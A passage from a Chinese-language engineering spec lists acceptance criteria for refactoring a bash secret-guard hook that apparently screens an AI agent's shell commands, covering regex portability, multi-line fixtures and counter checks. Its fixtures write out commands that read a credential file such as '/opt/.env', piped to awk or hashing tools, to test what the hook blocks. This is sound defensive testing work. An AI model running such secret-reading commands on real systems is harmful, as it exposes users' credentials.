- [ ] SC-15 (`has_filter` 13 处转内建**语义不变**, §What.4 的验收 — **R5 按候选 A 重写**): **统一判据 = 改前改后判定逐条一致** (不再有例外条款; v5 的三条 fixture 曾与自己的 Task 1.3b 互斥, 见下)。基础 26 条 = 每处 命中/不命中 各 1 条。
  - **维度 1 — 多行, 正负双向 (R4 tech-lead R4-C-1 + R4 backend-architect CRITICAL-1 提出方向; R5 三席补齐负向)**: **13 处判据每处 2 条**多行 fixture, 断言**改后与 canonical 逐条一致**:
    - **正向** (该不给 credit 就别给): credit 子句本身被换行拆开, 如 `cat /opt/.env | awk 'BEGIN{}⏎{print $1}'` (canonical: 拦) / `… |⏎sha256sum` (canonical: 不给 credit)
    - **负向** (该给 credit 就得给, **v5 完全缺这一半**): 无关前导行 + 单行完整 credit 子句, 如 `echo start⏎cat /opt/.env | sha256sum` (canonical: 给 credit ⇒ 放行) / `cat /opt/.env \\⏎  >/dev/null` (反斜杠续行, **= 本 spec 自己推荐的迁移写法**)
  - **三条端到端形态写死** (canonical 直调实测值, R5-fix 执笔者复核): `… | jq keys⏎echo done` → **0** / `cd /tmp⏎… | jq keys⏎echo finished` → **0** / `cat /opt/.env | awk 'BEGIN{}⏎{print $1}'` → **2**。三条改后须**保持**这三个值。
    > **v5 在这里是不可满足的**: 它把这三条写成 fixture, 同时又在 Task 1.3b 强制段级换行守卫 —— 而守卫对三条产出 `2 / 2 / 2`, 前两条与「逐条一致」直接冲突。两条都是 enabled 判据, Rule #10 下 Phase B 哪条都不能自行裁 ⇒ **结构性卡死**。候选 A 实测产出 `0 / 0 / 2`, 三条同时满足, 判据回到单一口径。
  - **维度 2 — 分支覆盖 (R4 qa-engineer §3)**: 含多分支 alternation 的判据须**逐分支**各 1 条, 不得只测「最自然」那个 —— 现有 366 条语料只覆盖 `sha256sum` / `jq keys` / `wc -l`, 而 `jq length|paths|leaf_paths` / `md5sum|sha1sum|sha512sum` 等分支零覆盖, **SC-15 与 SC-11 会在这类缺陷上互相掩护**
  - **反事实 (三种坏实现, 已机械复算)**:

    | 坏实现 | 会红的 fixture | R5-fix 执笔者实测 |
    |--------|---------------|-------------------|
    | 字面直译 (无逐行) | 正向多行 + 端到端 3 条 | 23 条 credit 探针中 **5 条**分歧 / 端到端 11 条中 **3 条** |
    | **段级换行守卫 (v5 强制的那个)** | **负向多行几乎全部** + 端到端前 2 条 | 23 条中 **20 条**分歧 / 端到端 11 条中 **8 条**; 13/13 处判据全中招 |
    | 某一处正则转写出错 | 该处的命中/不命中 fixture | — |

    **正确实现 (逐行 helper) 实测 0 分歧**: 13 正则 × 11 对抗串 **0/143**、credit 探针 **0/23**、端到端 **0/11**、全语料 **0/305**。
  - **⚠️ 本 SC 的信号不被稀释**: credit 重构是**零行为变更**的 (§Impact), 所以这里任何一条翻转都是 bug, 不存在「设计内的预期翻转」把它盖过去。**全语料 (SC-11) 对本条恒绿** —— 字面直译 0/305、段级守卫 0/305, 305 条里仅 6 条含换行且无一条依赖 credit ⇒ **SC-11 不能替代本 SC**
- [ ] SC-16 (正则可移植性 — **R4 code-reviewer C-1 事实勘正后重写**): `safe_to_split()` **新写的**正则 + 13 处 credit 判据的正则**全部**在 bash `[[ =~ ]]` 下实跑验证。
  - 范围说明: 采候选 A 后 13 处正则**文本一个字节未改** (只是求值方式由 `grep` 逐行改为 helper 逐行), 故它们的可编译性本已由生产环境 366 测试全绿背书; 本 SC 对它们是**回归确认**, 真正的新风险面在 `safe_to_split()` 新写的那几条 (关键字 / 作用域内建 / 命令位置交替)
  - **禁用清单收窄为 `(?:…)` 一项** (实测 rc=2 编译失败)。前一版把 `\b` / `\s` 一并列为「bash 不支持」是**事实错误** —— 三方独立实测均支持 (glibc GNU 扩展), 本 hook 141 条 pattern 里 16 条含 `\b` 且 366 测试全绿
  - `\b` / `\s` / `\w` **允许保留**, 但须在本 SC 记为「**已知 GNU 依赖**」; 非 glibc 平台 (macOS / BSD / musl) 的行为差异归**转出 9**
  - **不得**为满足本 SC 而把 `\b` 改写成 `([^a-zA-Z]|$)` 之类 —— 语义真的会变 (`\b` 视 `_`/数字为词内字符), 会绕过 SC-15 的视野静默改变拦截面
  - **反事实 (随 SC-6 结构重算, R5-fix 执笔者机械复验 `sc16_cf.sh`)**: 逐字搬运含 `(?:…)` 的 Python 原型 → 关键字正则 rc=2 编译失败 → 该分支**静默恒假** (实测: `[[ =~ ]]` 编译失败不打印 stderr, `set -uo pipefail` 下也不中止, 直接走 else) → SC-6 转红 **7 项**:
    - 端到端 **6 条**: 关键字型 5 条 (`for` / `while` / `if` / `until` / `select`) + 换行位置型 1 条
    - 隔离单元断言 **1 条**: `case`
    - **不红 7 条**: 块字符型 (`{ }` / `( )` / `[[ && ]]` / `for ((;;))` / 反引号 / `$()` / heredoc) —— 纯字符类判定, 不受正则语法影响
    > **v5 写的是「三条」**, 那是按 SC-6 只有 3 个关键字 fixture 的**旧清单**算的, 而同一次编辑刚把 SC-6 扩到 6 个关键字 + 1 个换行位置 —— 改了上游 SC, 下游反事实没跟着改 (memory `feedback_spec_rework_leaves_downstream_ac_drift`)。v5 自己在同一句里警告「反事实**写宽**会让 Phase B 误以为没红满是别处出了问题」, 而它**写窄**的危害对称: Phase B 跑出 7 条红、spec 说该红 3 条, 于是去追那 4 条「多出来的红」是不是别处坏了。
  - **本 SC 是语法层检查, 结构上抓不到「编译通过但语义窄」** (如 R4 backend-architect CRITICAL-2 的裸 `^`) —— 那类由 SC-6 的换行 fixture 承担, 两者不可相互替代
- [ ] SC-17 (语料重复用例清理, **连续三轮未处理**): 删除 `secret-guard.test.sh` 中字节级重复的 `bash_case "FP-fix timeout run-env"`, 并断言全文件无重复用例名
- [ ] SC-18 (**权威计数器自身被断言**, R4→R5 code-reviewer M-3 三轮未落): 跑 `python3 aria/hooks/tests/corpus_census.py`, 其输出与 spec 正文**逐数字机械比对**, 任一不一致即失败 ——
  - 语料面: `65 / 49 / 16 / 15 / 1` + 换行边界 `5 (4 拦 + 1 放)` (§Impact 迁移面 / SC-2 / SC-3 的基数全部引用它)
  - 判据面 (§6 新增口径): 13 处判据行号清单恰 **13** 条 · `[[:space:]]+` **10** 处 / `[[:space:]]*` **12** 处 / 含 `[[:space:]]` **13** 处 · 换行影响面**两个基线口径各一个数** (严格 **11/13**、宽松 **13/13**)
  - **为什么必须有**: 这个计数器是 SC-2/SC-3 基数的唯一来源, 它算错一次就成为「权威的错答案」; 而同一份 spec 已为 `secret-hygiene.md` 的计数专门配了 SC-13, 计数器自己却三轮无断言 —— 不对称。
  - **反事实**: 计数器实现漂移 (如 quote-aware 状态机改坏) → 本 SC 红; 若无本 SC, 它只会让 SC-2/SC-3 的基数静默变错而**没有任何 SC 转红**
